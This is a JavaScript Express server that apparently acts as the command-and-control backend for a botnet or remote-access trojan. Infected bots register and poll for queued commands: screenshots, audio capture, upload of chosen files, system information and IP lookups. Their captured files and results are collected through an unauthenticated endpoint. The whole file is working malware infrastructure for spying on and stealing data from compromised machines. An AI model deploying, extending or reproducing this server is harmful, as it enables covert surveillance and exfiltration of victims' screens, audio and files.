const express = require("express");
const multer = require("multer");
const logger = require("./logger");
const {Channel} = require("./channel");

const {Idle, UploadFile, Ping, Announce, Screenshot, GetSysInfo, GetPublicIp, GetPrivateIp, AudioCapture} = require("./commands")

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        logger.info(JSON.stringify(req.body))

        // notify for file received in the correct channel
        const currentChannel = channels.find((channel) => channel.botId === req.body.botId)

        if (!currentChannel) {
            logger.info("No channel found for the req.")
            cb(null, null)
        }

        if (req.body.uploadType === "audio") {
            const filename = "audio-" + Date.now() + '-' + file.originalname
            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "audio"})
            cb(null, filename);
        } else if (req.body.uploadType === "screen") {
            const filename = "screen-" + Date.now() + '-' + file.originalname
            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "screen"})
            cb(null, Date.now() + '-' + filename);
        }
        else {
            const filename = "file-" + Date.now() + '-' + file.originalname
            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "file"})
            cb(null, filename);
        }
    }
});

// Create the multer instance
const upload = multer({ storage: storage });


const app = express();
const port = 3000;

app.use(express.json());

const bots = []; // { id: 1, name: "Bot 1", status: "online" },

const channels = []; 

function createChannel(botId) {
    logger.info("creating channel for bot : " + botId);
    const channel = new Channel(botId);
    channels.push(channel);
    return channel;
}

function registerBot(bot) {
    logger.info("registering bot : " + bot.name);
    createChannel(bot.id);
    bots.push(bot)
}

function sendCommand(command) {
    logger.info("sending command : " + command.name + "to : " + command.botId);
    const targetChannel = channels.find((channel) => channel.botId === command.botId)

    switch (command.name) {

        case "Ping" :
            logger.info("Adding ping command -> " + command.args.targetIp)
            const pingCommand = new Ping(command.args.targetIp)
            targetChannel.commands.push(pingCommand)
            break

        case "Screenshot":
            logger.info("Adding Screenshot command")
            const screenshotCommand = new Screenshot()
            targetChannel.commands.push(screenshotCommand)
            break

        case "AudioCapture":
            logger.info("Audio capture command")
            const audioCaptureCommand = new AudioCapture({length : command.args.length, path: command.args.path})
            targetChannel.commands.push(audioCaptureCommand)
            break

        case "GetSysInfo":
            logger.info("Adding GetSysInfo command")
            const sysInfoCommand = new GetSysInfo()
            targetChannel.commands.push(sysInfoCommand)
            break

        case "UploadFile":
            logger.info("Adding UploadFile command")
            const uploadCommand = new UploadFile({path: command.args.path})
            targetChannel.commands.push(uploadCommand)
            break

        case "GetPublicIp":
            logger.info("Adding GetPublicIp command")
            const publicCommand = new GetPublicIp()
            targetChannel.commands.push(publicCommand)
            break

        case "GetPrivateIp":
            logger.info("Adding GetPrivateIp command")
            const privateCommand = new GetPrivateIp()
            targetChannel.commands.push(privateCommand)
            break

    }
}

function popCommand(botId) {
    const targetChannel = channels.find((channel) => channel.botId === botId)
    if (!targetChannel) {
        sendCommand(new Idle())
    }
    targetChannel.commands.shift()
}

function getCommands(botId) {
    const targetChannel = channels.find((channel) => channel.botId === botId)

    if (!targetChannel) {
        const announceCommand = new Announce()
        return JSON.stringify(announceCommand)
    }

    const commands = targetChannel.commands

    if (commands.length >= 1) {
        command = commands.at(0)
        logger.info(`Command picked : ${command}`)
        return JSON.stringify(command)
    }

    const idleCommand = new Idle()
    logger.info(idleCommand)
    return JSON.stringify(idleCommand)
}

function addChannelMessage(botId, message) {
    const targetChannel = channels.find((channel) => channel.botId === botId)
    if (targetChannel) {
        logger.info("Adding message to channel.")
        targetChannel.messages.push(message)
    }

}

/* ADMIN routes  */ 

app.get("/backend/bots", (req, res) => {
    res.send(JSON.stringify(bots));
});

app.post("/backend/commands", (req, res) => {
    const payload = req.body;
    logger.info("receiving a POST request from : " + req.ip);

    sendCommand({  botId: payload.botId, name: payload.name, args: payload.args });
    logger.info("sending command to bot : " + payload.botId);
    res.send("OK");

});

app.get("/backend/commands", (req, res) => {


    const allCommands = {}

    channels.forEach((channel) => {
        allCommands[channel.botId] = channel.commands
    })

    res.send(JSON.stringify(allCommands));
});

app.get("/backend/channels", (req, res) => {
    res.send(JSON.stringify(channels));
});

/* --- ADMIN --- */ 


/* --- PUBLIC --- */ 
app.post("/",  upload.single('file'), (req, res) => {
    logger.info("receiving a POST request from : " + req.ip);
    logger.info("request body : " + JSON.stringify(req.body));

    const payload = req.body;

    if (req.body.uploadType) {
        logger.info("Received file.")
        res.send("OK");
        return;
    }

    if (payload.name === "ANNOUNCE") {
        registerBot({ id: payload.id, name: payload.name, status: "online"});
        res.send(JSON.stringify({ success : true}))
        return
    }

    else if (payload.name === "GET_COMMANDS") {
        logger.info("sending commands to bot : " + payload.id);
        const command = getCommands(payload.id)
        logger.info(command)
        res.send(command);
        return;
    }
    else if (payload.name === "COMMAND_RESULT") {
        logger.info("command result from bot : " + payload.id);
        logger.info("command result : " + payload.result);
        logger.info(payload.result)

        popCommand(payload.id)
        addChannelMessage(payload.id, payload.result)

    } else {
        logger.warn("unknown request");
    }

    res.send("OK");

   
});

/* --- PUBLIC --- */ 


app.listen(port, () => {
  console.log(`Application exemple à l'écoute sur le port ${port}!`);
});